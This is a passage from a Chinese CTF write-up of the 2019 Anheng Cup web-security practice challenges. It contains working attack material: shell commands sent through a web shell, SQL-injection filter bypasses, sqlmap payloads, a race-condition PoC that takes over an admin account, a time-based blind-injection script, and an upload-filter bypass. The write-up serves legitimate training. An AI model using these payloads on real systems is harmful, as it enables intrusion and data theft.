alt="1571128235789"></p><h2 id="0x04-找flag"><a href="#0x04-找flag" class="headerlink" title="0x04 找flag"></a>0x04 找flag</h2><p><code>GET /include/taglib/anemone.lib.php?x=find%20/%20-name%20flag</code></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128339477.png" alt="1571128339477"></p><p><code>GET /include/taglib/anemone.lib.php?x=cat%20/tmp/flagishere/flagishere/flagishere/flag</code></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128497061.png" alt="1571128497061"></p><p>（flag被人改了吗？）</p><h1 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p>尝试一些payload，看到有SQL注入：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571129558998.png" alt="1571129558998"></p><p>但是union,select会被过滤</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130055314.png" alt="1571130055314"></p><p>尝试<code>/*!select*/</code>绕过</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130170687.png" alt="1571130170687"></p><p>查库，得到news：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step2-1541417918841.png" alt="step2"></p><p>查表，得到admin表：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step3-1541417936188.png" alt="step3"></p><p>查列，得到flag列</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step4.png" alt="step4"></p><p>查记录，得到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step5.png" alt="step5"></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>尝试sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -r D:\MEGAsync\mooctest2019exer\new-news.txt  --level 3 --risk 3</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 233 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: word=-2704<span class="string">' OR 5368=5368-- AyLy&amp;number=5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)</span></span><br><span class="line"><span class="string">    Payload: word=test'</span> OR SLEEP(5)-- pJuo&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h1><p>看到<code>/index.php?url=upload</code>可以想到url可能存在文件包含/SSRF/URLRedirect问题：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131861906.png" alt="1571131861906"></p><p>base64decode后得到flag</p><h1 id="新闻搜索"><a href="#新闻搜索" class="headerlink" title="新闻搜索"></a>新闻搜索</h1><p>尝试注入</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130487146.png" alt="1571130487146"></p><p>一步步注入得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word=test&apos; union select 1,2,3 %23&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><p>扫描发现源代码泄露：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130863836.png" alt="1571130863836"></p><p>还原源代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./Dumper/gitdumper.sh http://114.55.36.69:8023/.git/ /temp/hackerone</span><br><span class="line">./Extractor/extractor.sh /temp/hackerone /temp/hackerone</span><br></pre></td></tr></table></figure><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>从index.php:11-14看到，如果是管理员，则可以拿到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571212369176.png" alt="1571212369176"></p><p>跟is_admin(class.user.php):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">       <span class="comment">// 检查用户名是否合法</span></span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">       <span class="comment">//获取userfile，其中有一属性为is_admin</span></span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'is_admin'</span>] === <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_username</span><span class="params">($username)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($username) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^[_\.\-0-9a-zA-Z]+$/i'</span>, $username)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_attrs</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$users = zUserFile::get_all_users();</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $users[<span class="string">'attrs'</span>][$username];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>is_admin没有突破口，但是跟流程的时候，发现注册用户有切换用户功能，看一下切换用户逻辑怎么做的：</p><p>switch.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$userObj = <span class="keyword">new</span> zUser();</span><br><span class="line">$user = zUserFile::get_attrs($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$users = zUserFile::get_relate_users($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($username != <span class="keyword">false</span> &amp;&amp; zUserFile::is_exists($username))&#123;</span><br><span class="line">$to_user = zUserFile::get_attrs($username);</span><br><span class="line">    <span class="comment">// 当前用户和目标用户以通过邮箱验证，并且当前用户邮箱与目标用户邮箱一致</span></span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $to_user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $user[<span class="string">'email'</span>] === $to_user[<span class="string">'email'</span>])&#123;</span><br><span class="line">$userObj-&gt;login2($username);</span><br><span class="line">header(<span class="string">'Location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login2</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$username = trim($username);</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题转化为把自己邮箱弄成admin邮箱，继续审计绑定邮箱过程（chgemail.php、class.user.php）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(!chktoken())&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID REQUEST'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$email = <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>])?trim($_POST[<span class="string">'email'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;chg_email($_SESSION[<span class="string">'username'</span>], $email))<span class="comment">//修改绑定邮箱</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'SUCCESS'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'FAILED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg_email</span><span class="params">($username, $email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($email == <span class="keyword">false</span> || !zUserFile::validate_email($email))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$old_email = $user[<span class="string">'email'</span>];</span><br><span class="line">$emails = zUserFile::get_emails();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($emails[$old_email]))&#123;</span><br><span class="line">$emails[$old_email] = array_diff($emails[$old_email], <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">if</span>($emails[$old_email] == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">unset</span>($emails[$old_email]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 重绑定邮箱后，email_verify被重置, token被重置</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">0</span>);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email'</span>, $email);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">$us = @is_array($emails[$email])?$emails[$email]:<span class="keyword">array</span>();</span><br><span class="line">$emails[$email] = array_merge($us, <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">return</span> zUserFile::update_emails($emails);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($email) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> filter_var($email, FILTER_VALIDATE_EMAIL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说重新绑定邮箱时，需要重新发邮件，然后验证，再看下验证部分代码（verify.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'token'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">$token = <span class="keyword">isset</span>($_GET[<span class="string">'token'</span>])?trim($_GET[<span class="string">'token'</span>]):<span class="string">''</span>;</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;\</span><br><span class="line">    <span class="comment">// token和username不为空</span></span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span> || $username == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID INPUT'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;verify_email($username, $token))&#123;</span><br><span class="line">$userObj-&gt;login($username);</span><br><span class="line">header(<span class="string">'location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID TOKEN OR USERNAME'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php::zUser::verify_email</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_email</span><span class="params">($username, $token)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$token = trim($token);</span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$real_token = $user[<span class="string">"token"</span>];</span><br><span class="line">        <span class="comment">// 验证提交的token是否和数据库里的用户对应的token一致</span></span><br><span class="line"><span class="keyword">if</span>(md5($real_token) !== md5($token))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// token被重置</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// Condition Race</span></span><br><span class="line">        <span class="comment">// verify设为1</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>审到这里想到条件竞争，如果走正常重置邮箱的流程，程序执行到<code>zUserFile::update_attr($username, &#39;token&#39;, &#39;&#39;);</code>时，再次请求重置邮箱，由于class.user.php::validate_email()没有检查valid状态，导致新的email被写入，程序再回到<code>zUserFile::update_attr($username, &#39;email_verify&#39;, 1);</code>，那么攻击这就可以重置任意邮箱了。</p><p>梳理一下思路，也就是：</p><ol><li>注册用户验证邮箱</li><li>重置邮箱（这里邮箱还写自己的）</li><li>收到校验链接</li><li>在请求校验链接同时，再次重置邮箱为管理员邮箱（ambulong@vulnspy.com，注册界面出现过），若该步骤在比较token一致—-&gt;set(email_verify=1)中间执行，则条件竞争成功。</li></ol><p>因此有以下PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">HOST = <span class="string">"http://114.55.36.69:8023"</span></span><br><span class="line">VERIFY_URL = <span class="string">"/verify.php?token=7lGBgYOtvxoW7mRHdsGEFJqr6YMDIJjD&amp;username=admin1"</span></span><br><span class="line">SESSION=<span class="string">"h5evpbu7eclfe0kpfe3fad01q1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_verify</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.get(HOST + VERIFY_URL)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_email</span><span class="params">()</span>:</span></span><br><span class="line">    burp0_url = HOST + <span class="string">"/chgemail.php?token=JaX1dpl3"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"PHPSESSID"</span>: SESSION&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">"email"</span>: <span class="string">"ambulong@vulnspy.com"</span>, <span class="string">"submit"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line">    res=requests.post(</span><br><span class="line">        burp0_url,</span><br><span class="line">        cookies=burp0_cookies,</span><br><span class="line">        data=burp0_data)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    t1 = threading.Thread(target=send_verify, args=())</span><br><span class="line">    t2 = threading.Thread(target=reset_email, args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    poc()</span><br></pre></td></tr></table></figure><p>运行后看到邮箱被修改，切换用户就能拿到flag了</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571219028911.png" alt="1571219028911"></p><h1 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h1><p>PHP特性，</p><ol><li><p>参数名为A.A会转变为A_A，</p></li><li><p>数组&gt;inf</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196679531.png" alt="1571196679531"></p></li><li><p>数组转换成字符串时会出错，因此结果==0</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196848622.png" alt="1571196848622"></p></li></ol><p>因此有payload：<code>/?A.A[]=1</code></p><h1 id="新瓶装旧酒"><a href="#新瓶装旧酒" class="headerlink" title="新瓶装旧酒"></a>新瓶装旧酒</h1><p>73-81行需要传一个合法zip文件，无法绕过：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211251759.png" alt="1571211251759"></p><p>接着，92-105行解压zip，并且移动到upload目录下：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211484309.png" alt="1571211484309"></p><p>要求zip中存在图片后缀的文件，并且不包含”.ph”字符，可以通过”x.pHp.jpg”绕过，上传成功：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211770075.png" alt="1571211770075"></p><h1 id="sleepcms"><a href="#sleepcms" class="headerlink" title="sleepcms"></a>sleepcms</h1><p>敏感路径扫描，发现<code>/robots.txt</code>泄露，打开发现提示</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571199573631.png" alt="1571199573631"></p><p>以及注入点 <code>/article.php?id=2</code></p><p>跑黑名单，发现select、sleep和benchmark都banned，解法是通过GET_LOCK</p><blockquote><p>GET_LOCK(str,timeout)<br>Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.</p></blockquote><p>因此尝试<code>/article.php?id=2&#39; and (get_lock(&#39;vvvv&#39;,10)) #</code>可以成功延时，注意到同表做列查询时不需要用select，因此有如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleepcms</span><span class="params">()</span>:</span></span><br><span class="line">    base_url = <span class="string">"http://114.55.36.69:8007/article.php?id="</span></span><br><span class="line">    dic = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    cur = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"1'/**/and/**/(if(substr(content,&#123;pos&#125;,1)='&#123;char&#125;',get_lock('nonce',3),0))/**/#"</span></span><br><span class="line">            url = base_url+urllib.parse.quote(payload.format(pos=cur,char=i))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                flag += str(i)</span><br><span class="line">                cur += <span class="number">1</span></span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sleepcms()</span><br></pre></td></tr></table></figure><p>运行得到flag：<code>flagis{Flag{C221e22A28b933f103f0f88caB68b79b}}</code>，改成小写提交最里面括号的内容</p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>要求<code>$_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])</code>，强网杯原题，参考<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">如何用不同的数值构建一样的MD5</a>。</p><p>指定param1和param2相同的开头，这里以”1”为例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1&gt;init.txt</span><br></pre></td></tr></table></figure><p>接着使用fastcoll生成具有相同md5的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">λ fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: <span class="string">'1.txt'</span> and <span class="string">'2.txt'</span></span><br><span class="line">Using prefixfile: <span class="string">'init.txt'</span></span><br><span class="line">Using initial value: b012cf77f9677e37eea923017fc5e83e</span><br><span class="line"></span><br><span class="line">Generating first block: ..</span><br><span class="line">Generating second block: S00....</span><br><span class="line">Running time: 0.641 s</span><br></pre></td></tr></table></figure><p>将1.txt和2.txt内容进行编码后发送即可的得到flag。</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571140925389.png" alt="1571140925389"></p><p>提供代码方便复现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $text1=$_POST["data1"];</span></span><br><span class="line"><span class="comment">// $text2=$_POST["data2"];</span></span><br><span class="line"></span><br><span class="line">$text1=readmyfile(<span class="string">"1.txt"</span>);</span><br><span class="line">$text2=readmyfile(<span class="string">"2.txt"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD51: '</span>. md5($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode ($text1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD52: '</span>.md5($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span 